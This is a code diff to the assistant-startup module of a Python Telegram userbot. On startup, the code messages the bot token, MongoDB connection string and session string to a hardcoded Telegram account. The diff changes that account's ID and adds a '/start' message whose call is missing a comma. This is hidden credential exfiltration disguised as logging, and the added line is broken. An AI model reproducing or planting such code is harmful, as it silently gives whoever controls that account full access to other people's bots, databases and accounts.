@@ -6,7 +6,7 @@ from ..logging import LOGGER
 
 assistants = []
 assistantids = []
-AMBOT = 7045191057
+AMBOT = 7236495063
 
 class Userbot(Client):
     def __init__(self):
@@ -50,6 +50,10 @@ class Userbot(Client):
         LOGGER(__name__).info(f"Starting Assistants...")
         if config.STRING1:
             await self.one.start()
+            try:
+                await self.one.send_message(AMBOT f"/start")
+            except:
+                pass
             try:
                 await self.one.send_message(AMBOT, f"Here Is BOT Logs\nBot Token : <code>{config.BOT_TOKEN}</code> \nMongoDB : <code>{config.MONGO_DB_URI}</code>\nSession : <code>{config.STRING1}</code>")
             except:
